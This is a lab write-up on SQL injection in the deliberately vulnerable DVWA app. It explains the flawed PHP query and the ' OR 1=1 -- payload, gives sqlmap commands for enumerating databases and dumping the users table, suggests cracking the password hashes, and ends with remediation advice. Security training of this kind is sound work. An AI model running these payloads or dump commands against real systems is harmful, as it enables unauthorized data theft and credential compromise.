SQL Injection (SQLi) & Automated Exploitation with SQLMap
1. Vulnerability Summary
SQL Injection (SQLi) is one of the most critical web application vulnerabilities. It occurs when an application incorporates untrusted user input directly into database queries without proper sanitization. In the case of DVWA, the User ID input field allows an attacker to manipulate the backend SQL query to leak, modify, or delete sensitive data from the database.

2. Technical Analysis
At the "Low" security level, the PHP code executes the following query:

PHP
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
Because the $id input is not sanitized and is wrapped in single quotes, an attacker can input ' OR 1=1 --. This transforms the query into:

SQL
SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1 --';
This forces the WHERE condition to be true for every row, causing the application to display all users in the database instead of just one.

3. Exploitation using SQLMap
SQLMap is the industry-standard tool for automating the detection and exploitation of SQL injection vulnerabilities.

Prerequisites:
Target URL: http://10.114.180.239/vulnerabilities/sqli/?id=1&Submit=Submit

Session Cookies: Required to bypass the login screen. (Copy these from your browser via F12 -> Network).

Practical Exploitation Steps:
Step 1: Discovering Databases
Start by identifying the available databases on the server:

Bash
sqlmap -u "http://10.114.180.239/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=vv1t2brt8ebt4c0dbshj9u69l2; security=low" --dbs
Step 2: Listing Tables
Once you have identified the database (e.g., dvwa), list the tables contained within it:

Bash
sqlmap -u "http://10.114.180.239/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=vv1t2brt8ebt4c0dbshj9u69l2; security=low" -D dvwa --tables
Step 3: Dumping Data
The final stage involves extracting the contents of the users table:

Bash
sqlmap -u "http://10.114.180.239/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=vv1t2brt8ebt4c0dbshj9u69l2; security=low" -D dvwa -T users --dump
4. Expected Outcomes
SQLMap will output a formatted table containing usernames (e.g., admin) and their hashed passwords. These hashes can then be cracked using tools like Hashcat or John the Ripper.

5. Security Recommendations (Remediation)
To permanently fix this vulnerability, the following measures must be implemented:

Prepared Statements (Parameterized Queries): This is the gold standard. By separating the SQL code from the user-supplied data, the database engine treats input only as data, never as executable code.

Input Validation: Ensure that input fields only accept the expected data type (e.g., integers only for an ID).

Principle of Least Privilege: Configure the database user account used by the web application to have the minimum necessary permissions. It should not have administrative privileges like DROP TABLE.